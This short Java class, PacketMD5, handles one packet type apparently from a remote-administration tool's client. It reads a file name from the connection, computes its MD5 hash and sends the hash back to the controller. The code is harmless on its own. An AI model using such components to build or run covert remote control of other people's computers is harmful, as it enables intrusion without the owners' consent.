package com.redpois0n.packets;

import com.redpois0n.Connection;
import com.redpois0n.common.codec.Md5;


public class PacketMD5 extends Packet {

	@Override
	public void read(String line) throws Exception {
		String file = Connection.readLine();
		
		String md5 = Md5.md5(file); 
		
		Connection.addToSendQueue(new PacketBuilder(Header.MD5, md5));
	}

}
